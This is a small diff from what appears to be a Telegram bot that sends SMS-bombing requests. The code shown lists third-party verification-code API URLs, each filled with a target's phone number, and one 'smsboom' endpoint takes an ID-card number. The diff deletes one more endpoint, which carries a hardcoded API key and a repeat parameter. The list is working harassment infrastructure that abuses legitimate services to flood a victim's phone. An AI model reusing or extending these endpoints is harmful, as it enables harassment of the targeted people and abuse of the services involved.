@@ -387,7 +387,7 @@ async def collect_time_input(update: Update, context: ContextTypes.DEFAULT_TYPE)
             f"https://api.hichefu.com/client-openapi/driver/user/getVerifyCode?phone={target_phone}",
             f"https://www.xinmeinet.cn/api/user/getMsg?status=1&touch={target_phone}",
             f"http://n103.top:84/smsboom/?hm={idcard}",
-            f"http://43.134.229.155/api/index/submit?key=ff102125815e3df1974a7be53afd4794&phone=[target_phone]&time=5"
+
             
         ]
 
